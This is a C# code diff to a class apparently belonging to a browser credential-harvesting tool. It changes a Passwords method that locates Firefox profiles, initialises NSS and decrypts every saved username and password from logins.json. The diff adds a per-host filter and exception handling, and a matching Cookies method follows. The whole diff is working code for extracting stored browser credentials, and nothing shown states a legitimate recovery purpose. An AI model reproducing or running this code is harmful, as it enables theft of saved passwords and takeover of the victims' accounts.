@@ -10,94 +10,104 @@ namespace dao
     class Firefox : IReader
     {
         public string BrowserName { get { return "Firefox"; } }
-        public IEnumerable<PassModel> Passwords()
+        public IEnumerable<PassModel> Passwords(string host = null)
         {
             string signonsFile = null;
             string loginsFile = null;
             bool signonsFound = false;
             bool loginsFound = false;
-            string[] dirs = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));
-
             var logins = new List<PassModel>();
-            if (dirs.Length == 0)
-                return logins;
-
-            foreach (string dir in dirs)
+            try
             {
-                string[] files = Directory.GetFiles(dir, "signons.sqlite");
-                if (files.Length > 0)
+                string[] dirs = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));
+
+                if (dirs.Length == 0)
+                    return logins;
+
+                foreach (string dir in dirs)
                 {
-                    signonsFile = files[0];
-                    signonsFound = true;
-                }
-
-                // find &quot;logins.json"file
-                files = Directory.GetFiles(dir, "logins.json");
-                if (files.Length > 0)
-                {
-                    loginsFile = files[0];
-                    loginsFound = true;
-                }
-
-                if (loginsFound || signonsFound)
-                {
-                    TableFF.NSS_Init(dir);
-                    break;
-                }
-
-            }
-
-            //if (signonsFound)
-            //{
-            //    using (var conn = new SQLiteConnection("Data Source=" + signonsFile + ";"))
-            //    {
-            //        conn.Open();
-            //        using (var command = conn.CreateCommand())
-            //        {
-            //            command.CommandText = "SELECT encryptedUsername, encryptedPassword, formSubmitURL FROM moz_logins";
-            //            using (var reader = command.ExecuteReader())
-            //            {
-            //                while (reader.Read())
-            //                {
-            //                    string username = TableFF.Decrypt(reader.GetString(0));
-            //                    string password = TableFF.Decrypt(reader.GetString(1));
-
-            //                    logins.Add(new PassModel
-            //                    {
-            //                        Username = username,
-            //                        Password = password,
-            //                        Url = reader.GetString(2)
-            //                    });
-            //                }
-            //            }
-            //        }
-            //        conn.Close();
-            //    }
-
-            //}
-
-            if (loginsFound)
-            {
-                FFLogins ffLoginData;
-                using (StreamReader sr = new StreamReader(loginsFile))
-                {
-                    string json = sr.ReadToEnd();
-                    ffLoginData = JsonConvert.DeserializeObject<FFLogins>(json);
-                }
-
-                foreach (LoginData loginData in ffLoginData.logins)
-                {
-                    string username = TableFF.Decrypt(loginData.encryptedUsername);
-                    string password = TableFF.Decrypt(loginData.encryptedPassword);
-                    logins.Add(new PassModel
+                    string[] files = Directory.GetFiles(dir, "signons.sqlite");
+                    if (files.Length > 0)
                     {
-                        Username = username,
-                        Password = password,
-                        Url = loginData.hostname
-                    });
+                        signonsFile = files[0];
+                        signonsFound = true;
+                    }
+
+                    // find &quot;logins.json"file
+                    files = Directory.GetFiles(dir, "logins.json");
+                    if (files.Length > 0)
+                    {
+                        loginsFile = files[0];
+                        loginsFound = true;
+                    }
+
+                    if (loginsFound || signonsFound)
+                    {
+                        TableFF.NSS_Init(dir);
+                        break;
+                    }
+
                 }
+
+                //if (signonsFound)
+                //{
+                //    using (var conn = new SQLiteConnection("Data Source=" + signonsFile + ";"))
+                //    {
+                //        conn.Open();
+                //        using (var command = conn.CreateCommand())
+                //        {
+                //            command.CommandText = "SELECT encryptedUsername, encryptedPassword, formSubmitURL FROM moz_logins";
+                //            using (var reader = command.ExecuteReader())
+                //            {
+                //                while (reader.Read())
+                //                {
+                //                    string username = TableFF.Decrypt(reader.GetString(0));
+                //                    string password = TableFF.Decrypt(reader.GetString(1));
+
+                //                    logins.Add(new PassModel
+                //                    {
+                //                        Username = username,
+                //                        Password = password,
+                //                        Url = reader.GetString(2)
+                //                    });
+                //                }
+                //            }
+                //        }
+                //        conn.Close();
+                //    }
+
+                //}
+
+                if (loginsFound)
+                {
+                    FFLogins ffLoginData;
+                    using (StreamReader sr = new StreamReader(loginsFile))
+                    {
+                        string json = sr.ReadToEnd();
+                        ffLoginData = JsonConvert.DeserializeObject<FFLogins>(json);
+                    }
+
+                    foreach (LoginData loginData in ffLoginData.logins)
+                    {
+                        string url = loginData.hostname;
+                        if (host != null && url != host) continue;
+                        string username = TableFF.Decrypt(loginData.encryptedUsername);
+                        string password = TableFF.Decrypt(loginData.encryptedPassword);
+                        logins.Add(new PassModel
+                        {
+                            Username = username,
+                            Password = password,
+                            Url = url
+                        });
+                    }
+                }
+                return logins;
             }
-            return logins;
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+                return logins;
+            }
         }
 
         public IEnumerable<Cookie> Cookies(string host = null)
